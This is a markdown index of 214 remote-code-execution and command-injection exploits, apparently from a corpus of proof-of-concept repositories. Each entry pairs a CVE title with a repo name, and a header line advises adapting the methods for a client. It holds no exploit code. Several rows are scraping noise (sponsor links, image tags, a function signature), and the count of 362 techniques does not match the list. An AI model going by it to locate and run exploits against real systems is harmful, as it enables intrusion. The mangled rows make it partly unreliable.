# RCE & Command Injection

_Run code/commands via injection, unsafe eval, template, or gadget chain._

Techniques: 362  |  Source corpus: poc-compact (GitHub PoC repos)

Format: technique = the **method** (what the bug/exploit does). Repo = exemplar to read for detail.
Never paste payload bodies verbatim into a client; use the method + adapt.

| # | Technique (method) | Exemplar repo |
|---|---|---|
| 1 | Langflow RCE Exploit (CVE-2025-3248) | `0-d3y_langflow-rce-exploit` |
| 2 | CVE-2024-47533 – Cobbler XMLRPC Authentication Bypass → Reverse Shell (Unauthenticated RCE) | `00xCanelo_CVE-2024-47533-PoC` |
| 3 | CVE-2025-32778 - Web-Check Command Injection Exploit | `00xCanelo_CVE-2025-32778` |
| 4 | CVE-2025-49113 – Roundcube Webmail RCE Exploit (Python PoC) | `00xCanelo_CVE-2025-49113` |
| 5 | CVE-2025-43920: Command Injection via Email Subject in GNU Mailman 2.1.39 (cPanel/WHM Bundle) | `0NYX-MY7H_CVE-2025-43920` |
| 6 | 本文是专为了php-CGi-RCE漏洞所编写的yaml文件-高危 | `0XFFFF-XD_CVE-2024-4577-PHP-CGI-RCE` |
| 7 | The porteplume plugin used by SPIP before 4.30-alpha2, 4.2.13, and 4.1.16 is vulnerable to an arbitrary code execution vulnerability. A remote and unauthenticated attacker can exec | `0dayan0n_RCE_CVE-2024-7954-` |
| 8 | RCE - CVE-2025-59528 Gogs <= 0.13.3 Exploit | `0dgt_CVE-2025-8110` |
| 9 | 🔥 CVE-2026-5029 — Code Runner MCP Server RCE | `0x00phantom-hat_CVE-2026-5029-Exploit` |
| 10 | CVE-2025-54123 — Hoverfly Middleware API Remote Code Execution | `0x00phantom-hat_Hoverfly-1.11.3-RCE-CVE-2025-54123-Exploit` |
| 11 | CVE-2024-3400: OS Command Injection Vulnerability | `0x0d3ad_CVE-2024-3400` |
| 12 | CVE-2024-21762 - FortiGate SSL VPN RCE Detection & Exploitation Tool | `0x13-ByteZer0_CVE-2024-21762` |
| 13 | MobSF Remote code execution (via CVE-2024-21633) | `0x33c0unt_CVE-2024-21633` |
| 14 | > 🚀 Help me work seamlessly with open source sharing by [sponsoring me on GitHub](https://github.com/0x676e67/0x676e67/blob/main/SPONSOR.md) | `0x676e67_vproxy` |
| 15 | Welcome to the CVE disclosures section of this repository! Here, you'll find a list of security vulnerabilities that I have discovered while working on Free Open Source Software (F | `0x72303074_CVE-Disclosures` |
| 16 | CVE-2025-32433 Erlang/OTP SSH RCE EXP | `0x7556_CVE-2025-32433` |
| 17 | CVE-2026-24061 Telnet RCE Exploit For Linux MacOS Windows | `0x7556_CVE-2026-24061` |
| 18 | 🚨 CVE-2025-32433: Unauthenticated RCE in Erlang/OTP SSH Server | `0xBlackash_CVE-2025-32433` |
| 19 | 🚨 CVE-2026-0300 - Critical Unauthenticated Remote Code Execution in Palo Alto Networks PAN-OS | `0xBlackash_CVE-2026-0300` |
| 20 | 🚨 CVE-2026-0770 — Langflow Unauthenticated RCE | `0xBlackash_CVE-2026-0770` |
| 21 | 🚨 CVE-2026-12485 - Critical Unauthenticated Remote Code Execution (RCE) | `0xBlackash_CVE-2026-12485` |
| 22 | 🚨 CVE-2026-20131 / Cisco FMC Critical RCE | `0xBlackash_CVE-2026-20131` |
| 23 | CVE-2026-20841 - Windows Notepad Remote Code Execution (RCE) | `0xBlackash_CVE-2026-20841` |
| 24 | 🚨 CVE-2026-21643 "FortiGhost" : Pre-Auth SQLi RCE in FortiClientEMS | `0xBlackash_CVE-2026-21643` |
| 25 | 🚨 CVE-2026-22241 - Open eClass Theme Import Remote Code Execution | `0xBlackash_CVE-2026-22241` |
| 26 | 🔐 CVE-2026-22812 - OpenCode Unauthenticated HTTP Server → Remote Code Execution (RCE) | `0xBlackash_CVE-2026-22812` |
| 27 | 🚨 CVE-2026-25089 - Critical OS Command Injection in FortiSandbox | `0xBlackash_CVE-2026-25089` |
| 28 | 🚨 CVE-2026-25769 - Wazuh Insecure Deserialization RCE | `0xBlackash_CVE-2026-25769` |
| 29 | 🚨 CVE-2026-27876 - Grafana Critical RCE via SQL Expressions | `0xBlackash_CVE-2026-27876` |
| 30 | 🔴 CVE-2026-32475 — Elementor Pro Unrestricted File Upload → RCE | `0xBlackash_CVE-2026-32475` |
| 31 | 🚨 CVE-2026-33017 - Critical Unauthenticated Remote Code Execution in Langflow | `0xBlackash_CVE-2026-33017` |
| 32 | 🚨 CVE-2026-34197 — Critical Jolokia RCE in Apache ActiveMQ | `0xBlackash_CVE-2026-34197` |
| 33 | 🚨 CVE-2026-34724 - Zammad < 7.0.1 - Server-Side Template Injection (SSTI) to Remote Code Execution (RCE) via AI Agent | `0xBlackash_CVE-2026-34724` |
| 34 | 🚨 CVE-2026-35273 - Oracle PeopleSoft PeopleTools Unauthenticated Remote Code Execution | `0xBlackash_CVE-2026-35273` |
| 35 | 🚨 CVE-2026-41089 - Critical Windows Netlogon Remote Code Execution (RCE) | `0xBlackash_CVE-2026-41089` |
| 36 | 🚨 CVE-2026-44277 - FortiAuthenticator Unauthenticated RCE | `0xBlackash_CVE-2026-44277` |
| 37 | 🚨 CVE-2026-4480 - Critical Remote Code Execution in Samba Printing Subsystem | `0xBlackash_CVE-2026-4480` |
| 38 | 🚨 CVE-2026-45829 - ChromaDB Pre-Auth RCE | `0xBlackash_CVE-2026-45829` |
| 39 | 🚨 CVE-2026-46817 - Critical Remote Code Execution | `0xBlackash_CVE-2026-46817` |
| 40 | 🚨 CVE-2026-48907 - JCE (Joomla Content Editor) Unauthenticated Remote Code Execution | `0xBlackash_CVE-2026-48907` |
| 41 | 🚨 CVE-2026-58138 — Unauthenticated Remote Code Execution | `0xBlackash_CVE-2026-58138` |
| 42 | CUPS RCE PoC (Remote Command Execution via exploit-chaining Foomatic-rip Injection) | `0xCZR1_PoC-Cups-RCE-CVE-exploit-chain` |
| 43 | CVE-2026-44402 — Voltronic Power SNMP Web Pro 1.1 Unauthenticated RCE | `0xCyp1337_CVE-2026-44402` |
| 44 | CVE-2026-57811 — Realtyna Organic IDX + WPL Real Estate Unauthenticated RCE | `0xCyp1337_CVE-2026-57811` |
| 45 | CVE-2026-63077 — JetBrains TeamCity Unauthenticated RCE | `0xCyp1337_CVE-2026-63077` |
| 46 | CVE-2026-82222 — GiveWP WordPress Plugin Unauthenticated RCE | `0xCyp1337_CVE-2026-82222-MassExploit` |
| 47 | <a href="https://www.buymeacoffee.com/0xDTC"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a knowledge&emoji=📖&slug=0xDTC&buttoncolour=FF5F5F&fontcolour=ffffff&fon | `0xDTC_XWiki-Platform-RCE-CVE-2025-24893` |
| 48 | CVE-2024-28397 js2py Sandbox Escape Exploit | `0xDTC_js2py-Sandbox-Escape-CVE-2024-28397-RCE` |
| 49 | FlowiseAI CVE Chain - ATO (CVE-2025-58434) and RCE (CVE-2025-59528) | `0xDaeras_Flowise-CVE-2025-58434-Chain-59528` |
| 50 | FreePBX 16 — Unauthenticated SQLi to RCE | `0xEhab_FreePBX-CVE-2025-57819-RCE` |
| 51 | CVE-2026-53753 — Crawl4AI AST Sandbox Escape → Pre-Auth RCE | `0xEnc0der_CVE-2026-53753` |
| 52 | (https://www.cve.org/CVERecord?id=CVE-2025-5721) - Multiple stored cross site scripting vulnerabilities in SourceCodester Student Result Management System v1.0 | `0xEricTee_CVE` |
| 53 | <img src="resources/logo.png" alt="Nginx UI Logo"> | `0xJacky_nginx-ui` |
| 54 | CVE-2024-6333 - Xerox Authenticated Remote Code Execution | `0xQRx_CVE-2024-6333` |
| 55 | CVE-2025-47812 — Wing FTP Server Unauth RCE (rewrite) | `0xS4N4TG_CVE-2025-47812` |
| 56 | CVE-2026-81780 — Hash Form RCE | `0xTerror_CVE-2026-81780-Hash-Form` |
| 57 | Simple exploit for Wing FTP Server RCE (CVE-2025-47812) to run commands and get a reverse shell. For educational use only. | `0xcan1337_CVE-2025-47812-poC` |
| 58 | Title: D-Link DCS-935L HNAP Service SetDeviceSettings Stack Buffer Overflow Vulnerability (RCE) | `0xcc12138_DCS-935L-HNAP-Service-CVE` |
| 59 | WAVLINK WiFi Router — CSRF Authentication Bypass Chained with Stored Command Injection | `0xcc12138_wavlink-nu516u1-csrf-command-injection-` |
| 60 | CVE-2025-71389 — Cal.com Unauthenticated RCE (react2shell) | `0xdak_CVE-2025-71389_exploit` |
| 61 | CVE-2026-14483 — Realtyna WPL / Organic IDX Unauthenticated Arbitrary File Upload → RCE | `0xdak_CVE-2026-14483_exploit` |
| 62 | CVE-2026-53595 (+ CVE-2026-53593) — FreeScout Anonymous ATO → RCE | `0xdak_CVE-2026-53595_exploit` |
| 63 | CVE-2026-56121 — Feast Registry Unauthenticated RCE (dill.loads) | `0xdak_CVE-2026-56121_exploit` |
| 64 | CVE-2026-59243 — Apache Airflow FAB Provider OAuth Auth Bypass → DAG RCE | `0xdak_CVE-2026-59243_exploit` |
| 65 | CVE-2026-63766 — GPT-SoVITS Unauthenticated OS Command Injection | `0xdak_CVE-2026-63766_exploit` |
| 66 | CVE-2026-67340 — ArcadeDB JAVASCRIPT Trigger-Script RCE (post-auth) | `0xdak_CVE-2026-67340_exploit` |
| 67 | CVE-2026-68771 — ComfyUI Unauthenticated Pickle Deserialization RCE | `0xdak_CVE-2026-68771_exploit` |
| 68 | CVE-2026-69098 — kotaemon unauthenticated deserialization RCE | `0xdak_CVE-2026-69098_exploit` |
| 69 | CVE-2026-9198 — Langflow OSS Unauthenticated RCE | `0xdak_CVE-2026-9198_exploit` |
| 70 | CVE-2026-39987 - Marimo Pre-Auth RCE | `0xdeadroot_CVE-2026-39987-marimo-rce` |
| 71 | CVE-2025-3248 — Langflow AI Remote Code Execution (Unauthenticated) | `0xgh057r3c0n_CVE-2025-3248` |
| 72 | CVE-2025-47812 – Wing FTP Server RCE via Lua Injection | `0xgh057r3c0n_CVE-2025-47812` |
| 73 | def injectrcetemplate(session, target): | `0xgh057r3c0n_CVE-2025-48827` |
| 74 | 🚀 CVE-2026-0770 – Langflow RCE (execglobal) PoC | `0xgh057r3c0n_CVE-2026-0770` |
| 75 | A Python exploitation tool for OpenCode Remote Code Execution (RCE) vulnerability affecting versions < v1.0.216. This tool provides multiple attack vectors including command execut | `0xgh057r3c0n_CVE-2026-22812` |
| 76 | CVE-2026-58138 — Conductor (3.21.21..<3.30.2) Unauthenticated Remote Code Execution | `0xgh057r3c0n_CVE-2026-58138` |
| 77 | <img src="logo.png" width="250px" alt="SysAid Logo"> | `0xgh057r3c0n_SysAid-PreAuth-RCE-Chain` |
| 78 | CVE-2026-27626 — OliveTin OS Command Injection (PoC) | `0xh7ml_CVE-2026-27626-PoC` |
| 79 | An unsafe deserialization vulnerability in Wazuh servers allows remote code execution through unsanitized dictionary injection in DAPI requests/responses. This issue arises from th | `0xjessie21_CVE-2025-24016` |
| 80 | CVE-2025-54123 Hoverfly Command Injection to RCE PoC | `0xk4rth1_CVE-2025-54123` |
| 81 | CVE-2024-29973 - Remote Command Injection Vulnerability | `0xlf_CVE-2024-29973` |
| 82 | 1. Check whether file (0xr2r.txt) is present on device by running below get request or We can verify same by openinig | `0xr2r_CVE-2024-3400-Palo-Alto-OS-Command-Injection` |
| 83 | DNN (formerly DotNetNuke) is an open-source web content management platform (CMS) in the Microsoft ecosystem. Prior to 10.1.1, the default HTML editor provider allows unauthenticat | `0xr2r_CVE-2025-64095` |
| 84 | CVE-2025-53770 SharePoint Deserialization RCE PoC | `0xray5c68616e37_cve-2025-53770` |
| 85 | CVE-2026-6307: V8 JS-to-Wasm type confusion → RCE on Chrome 146 | `0xsha_CVE-2026-6307` |
| 86 | CVE-2026-63030 + CVE-2026-60137 - “wp2shell”: unauthenticated RCE in WordPress core | `0xsha_wp2shell` |
| 87 | A proof-of-concept scanner for CVE-2025-55182, a critical unauthenticated Remote Code Execution (RCE) vulnerability in React Server Components (RSC). | `0xsj_CVE-2025-55182` |
| 88 | PoC-jenkins-rceCVE-2024-23897. | `10T4_PoC-Fix-jenkins-rce_CVE-2024-23897` |
| 89 | Unauthenticated SQL injection in Drupal Core on PostgreSQL via POST /user/login, escalated to remote code execution through PostgreSQL sessionpreloadlibraries. | `11romain_CVE-2026-9082` |
| 90 | 本工具用于利用 CVE-2025-3248 漏洞（基于Python的代码注入漏洞），通过构造恶意payload实现目标服务器的远程命令执行（RCE）。该漏洞存在于某Web应用的API接口中，攻击者可利用未验证的代码执行点注入任意Python代码。 | `12-test-12_CVE-2025-3248` |
| 91 | CVE-2024-9264-RCE-Exploit in Grafana via SQL Expressions | `14mb1v45h_cyberspace061` |
| 92 | <p align="center"><a href="https://1panel.pro"><img src="https://resource.1panel.pro/img/1panel-logo.png" alt="1Panel" width="300" /></a></p> | `1Panel-dev_1Panel` |
| 93 | A Cross-site Scripting (XSS) vulnerability exists in version v2024-01-05 of the indexmenu plugin when is used and enabled in Dokuwiki (Open Source Wiki Engine). A malicious attacke | `1s1ldur_CVE-2024-42758` |
| 94 | FortiWeb Authentication Bypass to Remote Code Execution Exploit | `34zY_CVE-2025-52970` |
| 95 | Metabase SQL Injection RCE | `34zY_CVE-2026-72898` |
| 96 | This is a multiple site scanner for CVE-2025-53770 Unauthenticated RCE Vulnerability. | `3a7_CVE-2025-53770` |
| 97 | RCE-QloApps-CVE-2024-40318 | `3v1lC0d3_RCE-QloApps-CVE-2024-40318` |
| 98 | CVE-2026-34486 — Apache Tomcat EncryptInterceptor RCE | `404-src_CVE-2026-34486` |
| 99 | CVE-2024-32002: Exploiting Git RCE via git clone | `431m_rcetest` |
| 100 | CVE-2025-32023 - Redis Remote Code Execution (RCE) 🚨 | `44528zja_Blackash-CVE-2025-32023` |
| 101 | GNU Binutils objdump — OOB Write → FSOP → Arbitrary Code Execution - CVE-2026-18220 | `4D4J_objdump-Out-Of-Bounds-write` |
| 102 | Wing FTP Server Remote Code Execution (RCE) Exploit (CVE-2025-47812) | `4m3rr0r_CVE-2025-47812-poc` |
| 103 | CVE-2026-32475 PoC : Elementor Pro Unauthenticated Arbitrary File Upload to RCE | `4minx_CVE-2026-32475` |
| 104 | CVE-2026-50522 Poc : SharePoint Deserialization RCE | `4minx_CVE-2026-50522` |
| 105 | CVE-2025-66034 — fontTools varLib Arbitrary File Write → RCE | `4nuxd_CVE-2025-66034` |
| 106 | CVE-2026-25212 – Percona PMM RCE PoC | `5170Temp_CVE-2026-25212` |
| 107 | XWiki RCE Exploit PoC (CVE-2025-24893) | `570RMBR3AK3R_xwiki-cve-2025-24893-poc` |
| 108 | CVE-2026-3854: RCE no GitHub via injeção no header X-Stat | `5kr1pt_CVE-2026-3854` |
| 109 | RCE no Roundcube (CVE-2025-49113) - Minha anotação do Obsidian .md | `5kr1pt_Roundcube_CVE-2025-49113` |
| 110 | CVE-2024-25641 RCE for Cacti 1.2.26 | `5ma1l_CVE-2024-25641` |
| 111 | React/Next.js RCE Exploit (CVE-2025-55182) | `5olitude_CVES` |
| 112 | XWiki Unauthenticated RCE Exploit | `80Ottanta80_CVE-2025-24893-PoC` |
| 113 | CVE-2025-8110 – Gogs ≤ 0.13.3 RCE PoC | `9xh4kv_CVE-2025-8110` |
| 114 | CVE-2025-27636 – Apache Camel RCE | `AC8999_CVE-2025-27636-RCE-in-Apache-Camel` |
| 115 | CVE-2025-12735 expr-eval RCE Exploit | `AN5I_cve-2025-12735-expr-eval-rce` |
| 116 | CVE-2025-63888 ThinkPHP 5.0.24 File Inclusion RCE Exploit | `AN5I_cve-2025-63888-exploit` |
| 117 | CVE-2025-64446 Fortinet FortiWeb Path Traversal RCE Exploit | `AN5I_cve-2025-64446-fortiweb-exploit` |
| 118 | 漏洞名称：Google Chrome Type Confusion | `AabyssZG_Chrome-RCE-Poc` |
| 119 | Remote Code Execution via n8n Workflows (Based on CVE-2025-68613) | `AbdulRKB_n8n-RCE` |
| 120 | SimplCommerce is affected by an integer overflow vulnerability in the cart logic, allowing manipulation of product quantities and total prices via crafted quantity parameters. | `AbdullahAlmutawa_CVE-2024-50944` |
| 121 | SimplCommerce is affected by a Broken Access Control vulnerability in the review system, allowing unauthorized users to post reviews for products they have not purchased. | `AbdullahAlmutawa_CVE-2024-50945` |
| 122 | SimplCommerce is affected by a race condition vulnerability in the checkout logic, allowing multiple users to purchase more products than are in stock via simultaneous checkout req | `AbdullahAlmutawa_CVE-2024-53476` |
| 123 | CVE-2025-55182 — React Server Components RCE / CTF Writeup | `AbdullahMaqbool22_Explosive-As-Hell-MCS-Qualifer-Web-500` |
| 124 | To create a Metasploit module that exploits the RCE vulnerability in WordPress via the unserialization of instances of the WPHTMLToken class, we'll focus on crafting a payload that | `Abdurahmon3236_-CVE-2024-31211` |
| 125 | Creating a Remote Code Execution (RCE) Metasploit module for the SSRF vulnerability (CVE-2024-38472) in Apache HTTP Server on Windows is challenging because SSRF itself doesn't dir | `Abdurahmon3236_CVE-2024-38472` |
| 126 | Proof of Concept (PoC) for Unauthenticated Remote Code Execution in Sourcecodester Poultry Farm Management System v1.0 | `Abdurahmon3236_CVE-2024-40110` |
| 127 | Here’s a structured README.md for the NETGEAR ProSAFE Network Management System Remote Code Execution (RCE) vulnerability PoC: | `Abdurahmon3236_CVE-2024-5246` |
| 128 | To create a Metasploit module to exploit the RCE vulnerability in the User Profile Builder WordPress plugin before version 3.11.8, we need to take advantage of the lack of proper a | `Abdurahmon3236_CVE-2024-6366` |
| 129 | How We Stopped a Crypto-mining Attack in Kubernetes Caused by a Next.js RCE | `Achanandhi-M_Kubecon-India-2026-Demo` |
| 130 | CVE-2024-3400 PAN-OS: OS Command Injection Vulnerability in GlobalProtect | `AdaniKamal_CVE-2024-3400` |
| 131 | 🚨 CVE‑2025‑53770 – SharePoint Zero-Day Variant Exploited for Full RCE | `AdityaBhatt3010_CVE-2025-53770-SharePoint-Zero-Day-Variant-Exploited-f` |
| 132 | CVE-2025-61882 - Oracle E-Business Suite Pre-Auth RCE Exploit | `AdityaBhatt3010_CVE-2025-61882-Oracle-E-Business-Suite-Pre-Auth-RCE-Ex` |
| 133 | 🎯 React2Shell (CVE-2025-55182): From React Server Components to Full RCE | `AdityaBhatt3010_React2Shell-CVE-2025-55182` |
| 134 | Gogs CVE-2025-8110 RCE Exploit | `AdityaInnovates_CVE-2025-8110-Gogs-RCE-Exploit` |
| 135 | Admidio: Your Open-Source User Management Solution | `Admidio_admidio` |
| 136 | CVE-2025-24813: Apache Tomcat RCE Proof of Concept | `Affapple_CVE-2025-24813-POC` |
| 137 | CVE-2025-53770 – Microsoft SharePoint Server 2019 Unauthenticated RCE via Deserialization | `Agampreet-Singh_CVE-2025-53770` |
| 138 | CVE-2025-49132 - Pterodactyl Panel RCE Exploit | `Ahmedf000_CVE-2025-49132_HTB_SEASON10` |
| 139 | CVE-2026-34486 Apache Tomcat EncryptInterceptor 绕过漏洞复现 | `AirSkye_CVE-2026-34486-poc` |
| 140 | 🔥 CVE-2025-6389 — Critical WordPress Zero-Day (RCE) | `AivarSaar_blackash-cve-2025-6389` |
| 141 | <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,2,5,30&height=200&section=header&text=CVE-2025-68664&fontSize=60&fontAlignY=35&desc=L | `Ak-cybe_CVE-2025-68664-LangGrinch-PoC` |
| 142 | A business logic vulnerability exists in the Add to Cart function of itsourcecode Agri-Trading Online Shopping System 1.0, which allows remote attackers to manipulate the quant par | `Akhlak2511_CVE-2024-50968` |
| 143 | A SQL injection vulnerability in orderview1.php of Itsourcecode Online Furniture Shopping Project 1.0 allows remote attackers to execute arbitrary SQL commands via the id parameter | `Akhlak2511_CVE-2024-50970` |
| 144 | A SQL injection vulnerability in print.php of Itsourcecode Construction Management System 1.0 allows remote attackers to execute arbitrary SQL commands via the mapid parameter. | `Akhlak2511_CVE-2024-50971` |
| 145 | A SQL injection vulnerability in printtool.php of Itsourcecode Construction Management System 1.0 allows remote attackers to execute arbitrary SQL commands via the borrowid paramet | `Akhlak2511_CVE-2024-50972` |
| 146 | CVE-2025-24813 Apache Tomcat RCE PoC | `Alaatk_CVE-2025-24813-POC` |
| 147 | This script is designed to exploit vulnerabilities in a Mailcow instance using Cross-Site Scripting (XSS) and Remote Code Execution (RCE). The script aims to: | `Alchemist3dot14_CVE-2024-30270-PoC` |
| 148 | CVE-2025-32434: PyTorch RCE Vulnerability - PoC | `AlexanderGumeniuk_CVE-2025-32434` |
| 149 | ⚠️ FontForge RCE — CVE-2024-25081 & CVE-2024-25082 - PoC | `AliElKhatteb_CVE-2024-25082_CVE-2024-25081` |
| 150 | Remote Command Execution (RCE) in UNIX system via CUPS | `Alie-N_cups-vulnerability-exploit` |
| 151 | CVE-2024-4577 - PHP-CGI Argument Injection RCE | `AlperenY-cs_CVE-2024-4577` |
| 152 | Apache Tomcat Unauthenticated RCE - CVE-2025-24813 | `AlperenY-cs_CVE-2025-24813` |
| 153 | Open WebUI vulnerable to Stored DOM XSS via prompts when 'Insert Prompt as Rich Text' is enabled resulting in ATO/RCE | `AlphabugX_CVE-2025-64495-POC` |
| 154 | Poultry Farm Management System v1.0 - RCE Exploit | `AnGrY-Althaf_CVE-2024-40110` |
| 155 | CVE-2025-50460: Remote Code Execution in modelscope/ms-swift via unsafe PyYAML deserialization | `Anchor0221_CVE-2025-50460` |
| 156 | CVE-2025-50461: Remote Code Execution via Unsafe Model Deserialization in Verl | `Anchor0221_CVE-2025-50461` |
| 157 | Prueba de concepto para una vulnerabilidad de ejecución remota de código en TensorFlow (<= 2.13.1) usando archivos .h5 maliciosos. | `AndyVillegas_tensorflow-hdf5-rce-poc` |
| 158 | wp2shell — WordPress Core Pre-Auth RCE | `AnggaTechI_CVE-2026-63030` |
| 159 | 🚀 CVE-2026-27966 - Langflow RCE Exploit Tool | `Anon-Cyber-Team_CVE-2026-27966--RCE-in-Langflow` |
| 160 | Storks: Remote Code Execution Vulnerability Exploitation Tool | `AnonStorks_CVE-2025-0282-Full-version` |
| 161 | WooCommerce Designer Pro <= 1.9.26 - Unauthenticated Arbitrary File Upload | `AnotherSec_CVE-2025-6440` |
| 162 | CVE-2024-23897: Jenkins Arbitrary File Read Vulnerability Leading to RCE | `Ap0dexMe0_CVE-2024-23897` |
| 163 | Wordpress SQLI-2-RCE Exploit | `Ap0dexMe0_CVE-2024-27956` |
| 164 | Ini adalah poc (agak tidak stabil) untuk [CVE-2024-38063](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063), RCE di tcpip.sys yang ditambal pada 13 Agustus 2024 | `ArenaldyP_CVE-2024-38063-Medium` |
| 165 | LetsDefend-SOC336-Windows-OLE-Zero-Click-RCE-Exploitation-Detected-CVE-2025-21298 | `Arkha-Corvus_LetsDefend-SOC336-Windows-OLE-Zero-Click-RCE-Exploitation` |
| 166 | Exploiting CVE-2024-27198-RCE Vulnerability | `ArtemCyberLab_Project-Exploiting-CVE-2024-27198-RCE-Vulnerability` |
| 167 | The porteplume plugin, utilized by SPIP versions prior to 4.30-alpha2, 4.2.13, and 4.1.16, is susceptible to a critical arbitrary code execution (RCE) vulnerability. This flaw all | `Arthikw3b_RCE-CVE-2024-7954` |
| 168 | CVE-2026-22241 : Open eClass Remote Code Execution (RCE) | `Ashifcoder_CVE-2026-22241` |
| 169 | CVE-2026-1702 - Improper Access Control – allows admin creation from user account in Sourcecodester Pet Grooming Management Software | `Asim-QAZi_Improper-Access-Control---in-Pet-Grooming-Management-Softwar` |
| 170 | Improper Access Control – allows unauthorized creation of users, bookings, consumers, and cylinders in SourceCodester Gas Agency Management System | `Asim-QAZi_Improper-Access-Control-in-SourceCodester-Gas-Agency-Managem` |
| 171 | CVE-2025-15495 - Arbitrary File Upload Leading to Remote Code Execution (RCE) | `Asim-QAZi_RCE-Simplephpblog-biggiedroid` |
| 172 | CVE-2026-44590 - sherlock-project/sherlock CI - RCE via pullrequesttarget Injection → Supply Chain Compromise | `Astaruf_CVE-2026-44590` |
| 173 | PoC for CVE-2025-26529 – Moodle XSS to RCE Exploit | `Astroo18_PoC-CVE-2025-26529` |
| 174 | 修复由于未对command进行xml转义导致的reverseshell失败的问题 | `AtoposX-J_CVE-2026-34197-Apache-ActiveMQ-RCE` |
| 175 | MachForm up to version 21 is affected by an authenticated unrestricted file upload which leads to a remote code execution. | `Atreb92_cve-2024-37762` |
| 176 | CVE-2026-23520 — Arcane Lifecycle Label RCE | `Augmaster_POC-CVE-2026-23520` |
| 177 | <a href="https://taipy.io?utmsource=github" target="blank"> | `Avaiga_taipy` |
| 178 | CVE-2025-24893 - XWiki Remote Code Execution Exploit | `AzureADTrent_CVE-2025-24893-Reverse-Shell` |
| 179 | This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/). For more information see the [Code of Conduct FAQ](https://op | `Azure_azure-c-shared-utility` |
| 180 | This exploit demonstrates a critical remote code execution vulnerability (CVE-2025-32434) in PyTorch versions < 2.6.0. The flaw exists in the torch.load() function even when using  | `B1tBit_CVE-2025-32434-exploit` |
| 181 | ![CVE-2024-38856-RCE](https://socialify.git.ci/BBD-YZZ/CVE-2024-38856-RCE/image?description=1&forks=1&issues=1&language=1&name=1&owner=1&stargazers=1&theme=Light) | `BBD-YZZ_CVE-2024-38856-RCE` |
| 182 | A Proof of Concept developed by [@watchTowr](https://twitter.com/watchtowrcyber) exploiting the PHP CGI Argument Injection vulnerability (CVE-2024-4577) to obtain RCE on a vulnerab | `BLACK-ARCHIVERS_CVE-2024-4577` |
| 183 | CVE-2024-4577 RCE Exploit | `BTtea_CVE-2024-4577-RCE-PoC` |
| 184 | MCP RCE Proof of Concept - CVE-2026-23744 | `BabaCrow-byte_mcp-rce-poc` |
| 185 | Ni8mare: n8n Authentication Bypass & Remote Code Execution | `Bannt08_Research-CVE-2026-21858` |
| 186 | ModelScope Ms-Swift ModelFileSystemCache Deserialization of Untrusted Data Remote Code Execution Vulnerability | `Before-Rain_CVE-2025-50472` |
| 187 | CVE-2026-2587 Exploit PoC — Eclipse GlassFish EL Injection RCE Validator | `Bhanunamikaze_CVE-2026-2587-Exploit-POC` |
| 188 | CVE-2026-12940 — Langflow OSS ≤ 1.10.1 Unauthenticated RCE (MCP stdio env-var injection) | `BiiTts_CVE-2026-12940-Langflow-Unauth-RCE` |
| 189 | CVE-2026-44789 — n8n HTTP Request Node Pagination Prototype Pollution → RCE | `BiiTts_CVE-2026-44789-n8n-PrototypePollution-RCE` |
| 190 | CVE-2026-52887 — NocoBase SQL Injection → PostgreSQL-superuser RCE | `BiiTts_CVE-2026-52887-NocoBase-SQLi-RCE` |
| 191 | CVE-2026-53753 — Crawl4AI Unauthenticated Remote Code Execution (AST Sandbox Escape) | `BiiTts_CVE-2026-53753-Crawl4AI-RCE` |
| 192 | CVE-2026-56121 — Feast Unauthenticated RCE via gRPC Registry Deserialization | `BiiTts_CVE-2026-56121-Feast-Unauth-RCE` |
| 193 | CVE-2026-58138 — Conductor Unauthenticated RCE via INLINE GraalVM Evaluator | `BiiTts_CVE-2026-58138-Conductor-Unauth-RCE` |
| 194 | Roundcube RCE Exploit (CVE-2025-49113) | `BiiTts_Roundcube-CVE-2025-49113` |
| 195 | Unitree Robot BLE Service Command Injection Analysis | `Bin4ry_UniPwn` |
| 196 | CVE-2025-1974 (IngressNightmare) is a critical (CVSS 9.8) unauthenticated Remote Code Execution vulnerability in the Kubernetes ingress-nginx admission controller. | `BoianEduard_CVE-2025-1974` |
| 197 | CVE-2026-73318: Missing authorization on force-agreement actions | `BomboBombone_CVE-2026-73318` |
| 198 | CVE-2025-62593 — Ray Remote Code Execution (unauthenticated) | `Boreas37_CVE-2025-62593-PoC` |
| 199 | CVE-2026-32475 — Elementor Pro Unauthenticated Arbitrary File Upload → RCE | `Boreas37_CVE-2026-32475-PoC` |
| 200 | CVE-2026-34910 / CVE-2026-34909 — UniFi OS Unauthenticated RCE & File Read | `Boreas37_CVE-2026-34910-PoC` |
| 201 | CVE-2026-43914 — Vaultwarden Email-2FA Brute-Force Protection Bypass | `Boreas37_CVE-2026-43914-PoC` |
| 202 | CVE-2026-44848 — Portainer: Missing Authorization on Docker Plugin Endpoints → Host RCE | `Boreas37_CVE-2026-44848-PoC` |
| 203 | CVE-2026-58455 — Dockwatch Unauthenticated RCE (auth bypass + command injection) | `Boreas37_CVE-2026-58455-PoC` |
| 204 | XSS2Shell — WordPress Pre-Auth XSS → RCE Chain PoC | `Boreas37_CVE-2026-64638-PoC-XSS2Shell-` |
| 205 | CVE-2026-64824 — Home Assistant Core Backup-Restore Symlink Path Traversal → RCE | `Boreas37_CVE-2026-64824-PoC` |
| 206 | CVE-2026-73678 — MindsDB Minds Platform Unauthenticated RCE (CVSS 10.0) | `Boreas37_CVE-2026-73678-PoC` |
| 207 | unifi os 5.0.6 pass traversal to admin &amp; code exec scripts | `BoredHackerBlog_unifi_5.0.6_exploitation` |
| 208 | CVE-2024-31214 - WordPress XSS to RCE | `BouroubaAmine_WordPress-Poc` |
| 209 | OpenSTAManager <= 2.9.8 — OS Command Injection in P7M File Processing | `BridgerAlderson_CVE-2025-69212-PoC` |
| 210 | Docker API Unauthenticated RCE (CVE-2025-9074) | `BridgerAlderson_CVE-2025-9074-PoC` |
| 211 | Zabbix-CVE-2024-42327 RCE PoC | `BridgerAlderson_Zabbix-CVE-2024-42327-SQL-Injection-RCE` |
| 212 | This repository contains details and potential exploit code for CVE-2024-38063, a critical Windows TCP/IP Remote Code Execution (RCE) vulnerability. The vulnerability allows an una | `Brownpanda29_Cve-2024-38063` |
| 213 | CVE-2024-40453 - Squirrelly v9.0.0 RCE | `BwithE_CVE-2024-40453` |
| 214 | CVE-2024-48061 Langflow vulnerable to remote code execution | `BwithE_CVE-2024-48061` |
